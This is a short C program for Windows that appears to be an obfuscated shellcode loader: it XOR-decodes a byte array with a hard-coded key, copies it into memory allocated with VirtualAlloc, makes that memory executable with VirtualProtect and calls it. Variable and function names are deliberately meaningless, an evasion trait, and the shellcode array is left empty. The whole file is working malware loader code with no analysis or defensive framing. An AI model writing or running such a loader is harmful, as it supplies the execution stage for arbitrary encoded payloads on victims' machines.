#include <stdio.h>
#include <string.h>
#include <Windows.h>

#define _A(x) x
#define _B __attribute__((section(".text")))

void _C(unsigned char* _D, size_t _E, const char* _F) {
    size_t _G = strlen(_F);
    size_t _H;
    for (_H = 0; _H < _E; _H++) {
        _D[_H] ^= _F[_H % _G];
    }
}

int main() {
    unsigned char _I[] =
        "";

    size_t _J = sizeof(_I);
    const char* _K = "#12122$14112";

    _C(_I, _J, _K);

    // Allocate executable memory
    LPVOID _L = VirtualAlloc(NULL, _J, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (_L == NULL) {
        printf("Failed to allocate memory.\n");
        return 1;
    }

    // Copy shellcode to allocated memory
    memcpy(_L, _I, _J);

    // Change memory protection to execute
    DWORD _M;
    VirtualProtect(_L, _J, PAGE_EXECUTE_READ, &_M);

    // Execute the shellcode
    ((void(*)())_L)();

    // Free the allocated memory
    VirtualFree(_L, 0, MEM_RELEASE);

    return 0;
}
